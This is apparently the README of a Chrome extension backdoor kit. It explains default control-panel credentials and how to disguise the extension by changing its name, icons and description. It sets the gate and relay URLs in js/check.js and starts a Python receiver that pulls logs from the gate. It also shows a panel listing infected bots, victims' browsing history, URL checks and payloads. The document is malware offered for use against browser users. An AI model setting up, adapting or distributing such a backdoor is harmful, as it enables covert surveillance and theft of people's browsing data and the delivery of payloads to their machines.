![Chrome browser backdoor](http://img15.hostingpics.net/pics/394637logoback.png)

## Information

Username panel : root

Password panel : toor

## Network

Backdoor => Relais => Web Panel

## Extension

![backdoor Chrome](http://s9.postimg.org/vvo5ncxy7/chrome.png)

## Change name, icones, description

change it on manifest

![Backdoor chrome](http://s15.postimg.org/yf0rmsfuj/rename.png)

## Change Gate on script

js/check.js

web : show.php

```JavaScript
    var server_web = "http://localhost:8888/"
    var lock_page = "relais/lock.php"
    var gate_page = "relais/index.php"
```

## Bot listing
![Backdoor chrome bots](http://s23.postimg.org/ti2uzy5rf/Capture_d_e_cran_2016_03_01_a_15_46_16.png)


## History listing
![Backdoor chrome history](http://s29.postimg.org/ofjozpb2f/Capture_d_e_cran_2016_03_01_a_16_04_43.png)


## Url checker & Payload 

Make it on webpanel

![backdoor chrome panel](http://img15.hostingpics.net/pics/130725Capturedecran20160114a112508.png)

## Get the log here

![backdoor chrome panel](http://img15.hostingpics.net/pics/277755panelback.png)

## lock.php

Update lock page with 1

![Backdoor lock](http://s27.postimg.org/vahc0lb8z/lock.png)

## Python receiver 

Update  GATE var on Cbackdoor.py

```Python
GATE = "http://localhost:8888/chromebackdoor/web/gate.php?last=1"
```

Start 

```Shell
python CBackdoor.py
```
![Backdoor chrome python receiver](http://s12.postimg.org/ywkao1mv1/Capture_d_e_cran_2016_01_18_a_19_43_39.png)

